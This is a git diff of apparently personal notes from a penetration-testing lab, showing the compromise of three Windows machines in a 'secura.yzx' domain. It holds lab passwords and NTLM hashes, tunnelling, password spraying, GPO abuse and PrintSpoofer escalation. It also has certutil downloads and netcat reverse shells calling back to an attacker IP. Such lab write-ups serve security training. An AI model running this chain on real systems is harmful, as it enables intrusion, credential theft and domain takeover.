@@ -14,8 +14,9 @@ Three-machine enterprise environment
 
 **Users:Passwords**
 - charlotte : Game2On4.!
-- michael
+- michael                                         <- Likely rabbit hole
 - administrator : Almost4There8.?
+	- NTLM     :faf613cedb73980bbd34e0a5514df813
 - Administrator - 95
 	- NTLM     : a51493b0b06e5e35f855245e71af1d14
 	- SHA1     : 02fb73dd0516da435ac4681bda9cbed3c128e1aa
@@ -31,7 +32,7 @@ Three-machine enterprise environment
 **proof.txt** - b0624467dd801d947277061ea5e6bb70
 
 ## Methodology:
-- Discovered website (44444/HTTP, 8443/HTTPS) with Nmap scan
+- Discovered website (`44444/HTTP`, `8443/HTTPS`) with Nmap scan
 - Manage Engine's Applications Manager v.14710 w/ manual browsing
 - Online search shows working default creds `admin:admin`
 	- Fuzzing seems like rabbit hole
@@ -533,6 +534,17 @@ evil-winrm -i 192.168.226.96 -u apache -p "New2Era4.\!"
 - local.txt - 8ec436f8a9df6984f440e9066ed80b08
 - proof.txt - e2587c78dce7bac15681d482ebec9a19
 
+## Methodology:
+- Discover `mysql` via nmap scan
+	- `-sCV` shows our kali isn't allowed to connect
+- Use `chisel` on 96 to create a tunnel loop to connect to MariaDB
+- Dump db for `Admin` and `charlotte` creds
+- Login via `evil-winrm` as `admin` & upgrade shell w/ `nc.exe`
+- Search for flags (Will need `-Force` as they're hidden)
+- Network Service attack w/ found creds against .97 shows `charlotte` can access SMB on all endpoints
+- Run WinPEASE & Mimikatz
+
+
 ## Nmap Scan
 
 #### Open Ports
@@ -621,12 +633,12 @@ evil-winrm -i 192.168.226.96 -u apache -p "New2Era4.\!"
 # Upgrading
 certutil.exe -urlcache -f http://192.168.45.224:8080/nc.exe
 
-nc.exe 192.168.45.224 6666 -e powershell.exe
+.\nc.exe 192.168.45.224 6666 -e powershell.exe
 ```
 
 ## Tunneling to access MySQL DB
 ```bash
-# Set up tunnel w/ chisel
+# Set up tunnel w/ chisel in Kali
 ./chisel server -p 8000 --reverse
 	2024/10/25 15:09:20 server: Reverse tunnelling enabled
 	2024/10/25 15:09:20 server: Fingerprint ER8rRFL8yr1lmK1BBUWTlsON3MBMVTGczmoO1J0L6pc=
@@ -715,11 +727,45 @@ evil-winrm -i 192.168.224.96 -u administrator -p "Almost4There8.?"
 		8ec436f8a9df6984f440e9066ed80b08
 ```
 
+## Network Services
+```bash
+nxc smb 192.168.224.95-97 -u charlotte -p Game2On4.! -d secura.yzx             
+	SMB         192.168.224.97  445    DC01             [*] Windows Server 2016 Standard 14393 x64 (name:DC01) (domain:secura.yzx) (signing:True) (SMBv1:True)
+	SMB         192.168.224.95  445    SECURE           [*] Windows 10 / Server 2019 Build 19041 x64 (name:SECURE) (domain:secura.yzx) (signing:False) (SMBv1:False)
+	SMB         192.168.224.96  445    ERA              [*] Windows 10 / Server 2019 Build 19041 x64 (name:ERA) (domain:secura.yzx) (signing:False) (SMBv1:False)
+	SMB         192.168.224.97  445    DC01             [+] secura.yzx\charlotte:Game2On4.! 
+	SMB         192.168.224.95  445    SECURE           [+] secura.yzx\charlotte:Game2On4.! 
+	SMB         192.168.224.96  445    ERA              [+] secura.yzx\charlotte:Game2On4.! 
+	Running nxc against 3 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00
 
+nxc ldap 192.168.224.97 -u users.txt -p pws.txt -d secura.yzx
+	SMB         192.168.224.97  445    DC01             [*] Windows Server 2016 Standard 14393 x64 (name:DC01) (domain:secura.yzx) (signing:True) (SMBv1:True)
+	LDAP        192.168.224.97  389    DC01             [-] secura.yzx\charlotte:New2Era4.! 
+	LDAP        192.168.224.97  389    DC01             [-] secura.yzx\michael:New2Era4.! 
+	LDAP        192.168.224.97  389    DC01             [-] secura.yzx\administrator:New2Era4.! 
+	LDAP        192.168.224.97  389    DC01             [-] secura.yzx\apache:New2Era4.! 
+	LDAP        192.168.224.97  389    DC01             [-] secura.yzx\charlotte:Reality2Show4!.? 
+	LDAP        192.168.224.97  389    DC01             [-] secura.yzx\michael:Reality2Show4!.? 
+	LDAP        192.168.224.97  389    DC01             [-] secura.yzx\administrator:Reality2Show4!.? 
+	LDAP        192.168.224.97  389    DC01             [-] secura.yzx\apache:Reality2Show4!.? 
+	LDAP        192.168.224.97  389    DC01             [+] secura.yzx\charlotte:Game2On4.!
+```
 
-## WinPEASE
+## WinPEAS
 
 ```powershell
+ÉÍÍÍÍÍÍÍÍÍÍ¹ Cached Creds
+È If > 0, credentials will be cached in the registry and accessible by SYSTEM user https://book.hacktricks.xyz/windows-hardening/stealing-credentials/credentials-protections#cached-credentials
+    cachedlogonscount is 10
+
+...
+ÉÍÍÍÍÍÍÍÍÍÍ¹ Enumerating PowerShell Session Settings using the registry
+    Name                                   Microsoft.PowerShell
+      BUILTIN\Administrators               AccessAllowed
+      NT AUTHORITY\INTERACTIVE             AccessAllowed
+      BUILTIN\Remote Management Users      AccessAllowed
+   =================================================================================================
+
 ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¹ Services Information ÌÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ
   [X] Exception: Cannot open Service Control Manager on computer '.'. This operation might require other privileges.
 
@@ -769,9 +815,23 @@ File: C:\xampp\tomcat\conf\tomcat-users.xml
 ```
 
 
+## Laterally Move to 97
+```bash
+evil-winrm -i 192.168.224.97 -u charlotte -p "Game2On4.\!"                          
+	Evil-WinRM shell v3.5
+	Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+	Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+	Info: Establishing connection to remote endpoint
+	*Evil-WinRM* PS C:\Users\TEMP\Documents> 
+```
+
+
 # 192.168.x.97
 
 Domain: secura.yzx
+
+- local.txt - f6754be5e8504176521ffe674fdf1691
+- proof.txt - 736f8124f726f6af42e79af1170faa4c
 
 #### Open Ports
 ```bash
@@ -852,3 +912,147 @@ nmap -Pn -sV -sC -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49665,
 	|_  message_signing: required
 ```
 
+## Foothold
+```bash
+evil-winrm -i 192.168.224.97 -u charlotte -p "Game2On4.\!"
+```
+## local.txt
+```powershell
+Get-ChildItem -Path C:\Users -Include local.txt,proof.txt -Recurse -ErrorAction SilentlyContinue -Force
+	    Directory: C:\Users\charlotte\Desktop
+	
+	Mode                LastWriteTime         Length Name
+	----                -------------         ------ ----
+	-a----       10/25/2024  11:06 PM             34 local.txt
+	*Evil-WinRM* PS C:\Users\TEMP\Documents> type C:\Users\charlotte\Desktop\local.txt
+	f6754be5e8504176521ffe674fdf1691
+
+```
+
+## Enumeration
+```powershell
+whoami
+	secura\charlotte
+whoami /priv
+	PRIVILEGES INFORMATION
+	----------------------
+	
+	Privilege Name                Description                               State
+	============================= ========================================= =======
+	SeMachineAccountPrivilege     Add workstations to domain                Enabled
+	SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
+	SeImpersonatePrivilege        Impersonate a client after authentication Enabled
+	SeIncreaseWorkingSetPrivilege Increase a process working set            Enabled
+```
+
+## WinPEAS
+```powershell
+ÉÍÍÍÍÍÍÍÍÍÍ¹ Searching executable files in non-default folders with write (equivalent) permissions (can be slow)
+     File Permissions "C:\Users\charlotte\Documents\SharpGPOAbuse.exe": charlotte [AllAccess]
+```
+
+## Elevating to Administrator - No idea if this is necessary
+- With [SharpGPOAbuse.exe](https://medium.com/@raphaeltzy13/group-policy-object-gpo-abuse-windows-active-directory-privilege-escalation-51d8519a13d7)
+```powershell
+certutil.exe -urlcache -f http://192.168.45.224:8080/PowerView.ps1 PowerView.ps1
+Import-Module .\PowerView.ps1
+
+# Get list of all GPOs
+Get-NetGPO | select displayname
+	displayname
+	-----------
+	Default Domain Policy
+	Default Domain Controllers Policy
+
+
+# Get ID
+Get-GPO -Name "Default Domain Policy"
+	DisplayName      : Default Domain Policy
+	DomainName       : secura.yzx
+	Owner            : SECURA\Domain Admins
+	Id               : 31b2f340-016d-11d2-945f-00c04fb984f9
+	GpoStatus        : AllSettingsEnabled
+	Description      :
+	CreationTime     : 8/5/2022 6:20:58 PM
+	ModificationTime : 10/25/2022 5:39:34 PM
+	UserVersion      : AD Version: 3, SysVol Version: 3
+	ComputerVersion  : AD Version: 70, SysVol Version: 70
+
+
+# Check user's perms (NOTE: 'Edit')
+Get-GPPermission -Guid 31b2f340-016d-11d2-945f-00c04fb984f9 -TargetType User -TargetName charlotte
+	Trustee     : charlotte
+	TrusteeType : User
+	Permission  : GpoEditDeleteModifySecurity
+	Inherited   : False
+
+
+# Add user to Admin group
+.\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount <user> --GPOName "Default Domain Policy"
+	[+] Domain = secura.yzx
+	[+] Domain Controller = dc01.secura.yzx
+	[+] Distinguished Name = CN=Policies,CN=System,DC=secura,DC=yzx
+	[+] SID Value of charlotte = S-1-5-21-3453094141-4163309614-2941200192-1104
+	[+] GUID of "Default Domain Policy" is: {31B2F340-016D-11D2-945F-00C04FB984F9}
+	[+] File exists: \\secura.yzx\SysVol\secura.yzx\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\Machine\Microsoft\Windows NT\SecEdit\GptTmpl.inf
+	[+] The GPO does not specify any group memberships.
+	[+] versionNumber attribute changed successfully
+	[+] The version number in GPT.ini was increased successfully.
+	[+] The GPO was modified to include a new local admin. Wait for the GPO refresh cycle.
+	[+] Done!
+
+
+# Force update new policy settings
+gpupdate /force
+	Updating policy...
+	Computer Policy update has completed successfully.
+	User Policy update has completed successfully.
+
+
+# Verify
+net localgroup administrators
+	Alias name     administrators
+	Comment        Administrators have complete and unrestricted access to the computer/domain
+	Members
+	-------------------------------------------------------------------------------
+	Administrator
+	charlotte
+	The command completed successfully.
+```
+
+## Elevating Privs
+- As we have `SeImpersonatePrivilege`
+```powershell
+certutil.exe -urlcache -f http://192.168.45.224:8080/PrintSpooferx64.exe PrintSpooferx64.exe
+
+# Didn't work
+.\PrintSpooferx64.exe -i -c powershell
+	[+] Found privilege: SeImpersonatePrivilege
+	[+] Named pipe listening...
+	[!] CreateProcessAsUser() failed because of a missing privilege, retrying with CreateProcessWithTokenW().
+	[!] CreateProcessWithTokenW() isn't compatible with option -i
+
+whoami
+secura\charlotte
+
+# Had to use a revshell
+PS C:\users\charlotte> .\PrintSpoofer64.exe -c "nc.exe 192.168.45.224 9997 -e cmd.exe"
+	[+] Found privilege: SeImpersonatePrivilege
+	[+] Named pipe listening...
+	[!] CreateProcessAsUser() failed because of a missing privilege, retrying with CreateProcessWithTokenW().
+	[+] CreateProcessWithTokenW() OK
+
+# In Kali's revshell 9997
+rlwrap nc -nlvp 9997
+	listening on [any] 9997 ...
+	connect to [192.168.45.224] from (UNKNOWN) [192.168.224.97] 51774
+	Microsoft Windows [Version 10.0.14393]
+	(c) 2016 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>whoami
+	whoami
+	secura\dc01$
+
+C:\Windows\system32> type C:\users\administrator.dc01\desktop\proof.txt
+	736f8124f726f6af42e79af1170faa4c
+```
